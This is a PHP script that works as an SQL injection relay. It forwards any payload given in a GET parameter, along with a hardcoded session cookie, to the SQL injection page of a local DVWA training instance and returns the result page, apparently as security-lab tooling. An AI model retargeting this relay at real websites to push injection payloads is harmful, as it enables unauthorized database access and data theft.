<?php
/**
 * SQL Injection Proxy Script
 * 
 * This script accepts an SQL injection payload via GET parameter 's',
 * URL encodes it, submits it to the target DVWA application via POST,
 * then retrieves and returns the results page.
 * 
 * Usage: access this script with ?s=[SQL injection payload]
 */

// Check if the SQL injection payload was provided
if (!isset($_GET['s'])) {
    die("Error: No SQL injection payload provided. Please provide a payload via the 's' GET parameter.");
}

// Configuration settings
$submitUrl = 'http://192.168.129.1/DVWA-1/vulnerabilities/sqli/session-input.php#';
$resultsUrl = 'http://192.168.129.1/DVWA-1/vulnerabilities/sqli';
$cookie = 'PHPSESSID=36jdcpecr86huucfq86imggkp4; security=high';

// Get and encode the SQL injection payload
$payload = $_GET['s'];
$encodedPayload = urlencode($payload);

// Prepare the POST data
$postData = "id=$encodedPayload&Submit=Submit";

// Initialize cURL session (we'll reuse this for both requests)
$ch = curl_init();

// Set common cURL options
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); // Return the transfer instead of outputting
curl_setopt($ch, CURLOPT_COOKIE, $cookie);      // Set the session cookie
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); // Follow redirects
curl_setopt($ch, CURLOPT_HEADER, false);        // Don't include headers in output

// First request: Submit the payload via POST
curl_setopt($ch, CURLOPT_URL, $submitUrl);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);

// Execute the POST request (we don't need the response from this)
$postResponse = curl_exec($ch);
if ($postResponse === false) {
    die("Error submitting payload: " . curl_error($ch));
}

// Second request: GET the results page
curl_setopt($ch, CURLOPT_URL, $resultsUrl);
curl_setopt($ch, CURLOPT_POST, false); // Switch back to GET
curl_setopt($ch, CURLOPT_POSTFIELDS, null); // Clear POST data

// Execute the GET request
$getResponse = curl_exec($ch);
if ($getResponse === false) {
    die("Error retrieving results: " . curl_error($ch));
}

// Close cURL session
curl_close($ch);

// Output the results
echo $getResponse;
?>